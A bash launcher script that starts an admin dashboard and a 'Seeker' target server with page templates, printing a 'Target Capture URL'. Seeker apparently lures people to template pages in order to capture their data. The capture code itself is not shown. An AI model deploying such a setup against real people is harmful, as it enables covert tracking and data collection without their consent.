#!/bin/bash
set -e

echo "============================================="
echo "   SEEKER TELEMETRY & TRACKING SERVER        "
echo "============================================="

# Ensure directories exist
mkdir -p logs db

# Initialize SQLite database
echo "[+] Initializing SQLite database (db/seeker.db)..."
python3 db_manager.py

# Export environment defaults
export PORT="${PORT:-8080}"
export ADMIN_PORT="${ADMIN_PORT:-8088}"
export TEMPLATE="${TEMPLATE:-0}"
export DEBUG_HTTP="${DEBUG_HTTP:-1}"

# Cleanup any stale PID files
rm -f pid logs/php.log logs/info.txt logs/result.txt

# Trap termination signals
cleanup() {
    echo "[!] Caught signal, shutting down services..."
    if [ -n "$ADMIN_PID" ]; then
        kill "$ADMIN_PID" 2>/dev/null || true
    fi
    if [ -n "$SEEKER_PID" ]; then
        kill "$SEEKER_PID" 2>/dev/null || true
    fi
    wait 2>/dev/null || true
    echo "[+] Graceful shutdown complete."
    exit 0
}

trap cleanup SIGINT SIGTERM

# Start Admin Dashboard Server (Port 8088)
echo "[+] Starting Admin Dashboard on port 8088..."
python3 admin_server.py &
ADMIN_PID=$!

# Small delay to ensure admin starts cleanly
sleep 1

# Start Seeker Target Engine (Port 8080, Template $TEMPLATE)
echo "[+] Starting Seeker Target Server on port $PORT with template $TEMPLATE..."
python3 seeker.py -t "$TEMPLATE" -p "$PORT" &
SEEKER_PID=$!

echo "[✔] Both services active!"
echo "    - Target Capture URL: http://0.0.0.0:$PORT"
echo "    - Admin Dashboard:    http://0.0.0.0:$ADMIN_PORT"

# Wait for processes
wait -n "$ADMIN_PID" "$SEEKER_PID"
cleanup
